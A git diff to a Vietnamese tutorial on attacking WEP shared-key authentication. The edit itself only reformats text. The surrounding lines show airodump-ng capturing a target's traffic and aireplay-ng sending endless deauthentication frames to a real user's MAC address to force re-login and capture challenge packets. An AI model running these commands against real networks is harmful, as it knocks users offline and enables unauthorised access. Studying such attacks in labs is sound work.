@@ -257,7 +257,8 @@ Sau đó bắt đầu theo dõi để bắt được các gói tin challenge.
 airodump-ng wlan0 -c < target's chanel > --bssid <target's bssid> -w keystream
 ```
 [![KeyStreamCreate.md.png](https://www.upsieutoc.com/images/2020/06/17/KeyStreamCreate.md.png)](https://www.upsieutoc.com/image/frF70s)
-Send gói tin deauthen để bắt các user phải đăng nhập lại để ta có thể bắt được các gói tin challenge. Sau khi người dùng đăng nhập lại, airodump-ng sẽ bắt được gói tin SKA.
+
+**Send gói tin deauthen** để bắt các user phải đăng nhập lại để ta có thể bắt được các gói tin challenge. Sau khi người dùng đăng nhập lại, airodump-ng sẽ bắt được gói tin SKA.
 ```
 aireplay-ng --deauth 0 -a <target's bssid> -c  < true user MAC >  wlan0
 ```
